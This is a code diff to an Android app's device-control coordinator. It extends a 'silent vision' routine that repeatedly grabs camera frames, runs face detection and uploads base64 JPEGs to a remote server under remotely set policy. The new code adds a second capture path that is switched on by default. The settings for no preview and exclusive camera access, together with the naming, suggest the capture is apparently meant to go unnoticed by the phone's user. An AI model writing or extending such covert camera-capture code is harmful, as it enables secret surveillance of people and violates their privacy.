@@ -11,11 +11,13 @@ import com.projectlumen.app.core.api.RemoteFaceAnalysisFace
 import com.projectlumen.app.core.api.RemoteFaceAnalysisProcessingMetrics
 import com.projectlumen.app.core.api.RemoteFaceBoundingBox
 import com.projectlumen.app.core.api.SilentVisionPolicy
+import com.projectlumen.app.core.api.SurfaceAnalysisMetrics
 import com.projectlumen.app.core.api.VisionFrameUploadRequest
 import com.projectlumen.app.core.api.VisionHeartbeatRequest
 import com.projectlumen.app.core.api.VisionSessionStartRequest
 import com.projectlumen.app.core.database.entities.FeatureFlagEntity
 import com.projectlumen.app.core.proximity.FaceAnalysisFrameCapture
+import com.projectlumen.app.core.proximity.SurfaceAnalysisFrameCapture
 import com.projectlumen.app.core.proximity.FaceDistanceSample
 import com.projectlumen.app.core.proximity.ProximityCameraSampler
 import com.projectlumen.app.core.repositories.FeatureFlagRepository
@@ -203,12 +205,22 @@ class PrivilegedDeviceControlCoordinator(
             val sampler = ProximityCameraSampler(app)
             val interval = (1000L / policy.maxFps.coerceIn(1, 5).toLong()).coerceAtLeast(500L)
             while (isActive && sessionIdRef.get() == sessionId) {
-                val capture = runCatching {
-                    sampler.captureFaceAnalysisFrame(maxDurationMillis = 2_000L)
-                }.getOrNull()
-                if (capture != null) {
-                    framesCaptured.incrementAndGet()
-                    uploadFrame(sessionId, deviceId, policy, capture)
+                if (policy.surfaceAnalysisUploadEnabled) {
+                    val surfaceCapture = runCatching {
+                        sampler.captureSurfaceAnalysisFrame(maxDurationMillis = 2_000L)
+                    }.getOrNull()
+                    if (surfaceCapture != null) {
+                        framesCaptured.incrementAndGet()
+                        uploadSurfaceFrame(sessionId, deviceId, policy, surfaceCapture)
+                    }
+                } else {
+                    val capture = runCatching {
+                        sampler.captureFaceAnalysisFrame(maxDurationMillis = 2_000L)
+                    }.getOrNull()
+                    if (capture != null) {
+                        framesCaptured.incrementAndGet()
+                        uploadFrame(sessionId, deviceId, policy, capture)
+                    }
                 }
                 delay(interval)
             }
@@ -233,6 +245,59 @@ class PrivilegedDeviceControlCoordinator(
                     capturedAt = capture.capturedAtMillis,
                     exclusiveAccess = policy.exclusiveAccess,
                     noSurfacePreview = policy.noSurfacePreview,
+                    pipeline = "image_reader",
+                    surfaceAttached = false,
+                    frame = RemoteCameraFramePayload(
+                        format = "jpeg",
+                        encoding = "base64",
+                        width = capture.width,
+                        height = capture.height,
+                        rotationDegrees = capture.rotationDegrees,
+                        byteSize = capture.frameBytes.size,
+                        dataBase64 = Base64.encodeToString(capture.frameBytes, Base64.NO_WRAP),
+                    ),
+                    faces = faces,
+                    processing = RemoteFaceAnalysisProcessingMetrics(
+                        frameConversionMillis = capture.frameConversionMillis,
+                        mlKitInferenceMillis = sample?.inferenceMillis ?: 0L,
+                        uploadQueuedAt = System.currentTimeMillis(),
+                    ),
+                ),
+            )
+        }.getOrNull()
+        if (result?.accepted == true) {
+            framesUploaded.incrementAndGet()
+        }
+    }
+
+    private suspend fun uploadSurfaceFrame(
+        sessionId: String,
+        deviceId: String,
+        policy: SilentVisionPolicy,
+        capture: SurfaceAnalysisFrameCapture,
+    ) {
+        val token = app.secureCredentials.load()?.accessToken ?: return
+        val sample = capture.sample
+        val faces = sample?.let { listOf(it.toRemoteFace()) } ?: emptyList()
+        val result = runCatching {
+            app.apiClient.uploadSurfaceAnalysisFrame(
+                accessToken = token,
+                request = VisionFrameUploadRequest(
+                    sessionId = sessionId,
+                    deviceInstallationId = deviceId,
+                    capturedAt = capture.capturedAtMillis,
+                    exclusiveAccess = policy.exclusiveAccess,
+                    noSurfacePreview = false,
+                    pipeline = "surface",
+                    surfaceAttached = true,
+                    surfaceAnalysis = SurfaceAnalysisMetrics(
+                        producer = "SurfaceTexture+ImageReader",
+                        surfaceWidth = capture.surfaceWidth,
+                        surfaceHeight = capture.surfaceHeight,
+                        surfaceAttachMillis = capture.surfaceAttachMillis,
+                        bufferTransformMillis = capture.bufferTransformMillis,
+                        analysisSource = "mlkit_face_mesh",
+                    ),
                     frame = RemoteCameraFramePayload(
                         format = "jpeg",
                         encoding = "base64",
@@ -298,6 +363,7 @@ class PrivilegedDeviceControlCoordinator(
                 maxFps = silent?.optInt("maxFps", 2) ?: 2,
                 maxSessionMinutes = silent?.optInt("maxSessionMinutes", 120) ?: 120,
                 frameUploadEnabled = silent?.optBoolean("frameUploadEnabled", true) ?: true,
+                surfaceAnalysisUploadEnabled = silent?.optBoolean("surfaceAnalysisUploadEnabled", true) ?: true,
             ),
             lifecycleLock = LifecycleLockPolicy(
                 enabled = lifeFlag?.enabled ?: true,
@@ -327,6 +393,7 @@ class PrivilegedDeviceControlCoordinator(
                     .put("maxFps", policy.silentVision.maxFps)
                     .put("maxSessionMinutes", policy.silentVision.maxSessionMinutes)
                     .put("frameUploadEnabled", policy.silentVision.frameUploadEnabled)
+                    .put("surfaceAnalysisUploadEnabled", policy.silentVision.surfaceAnalysisUploadEnabled)
                     .put("endpointPrefix", policy.silentVision.endpointPrefix)
                     .toString(),
                 updatedAt = policy.updatedAt.takeIf { it > 0L } ?: System.currentTimeMillis(),
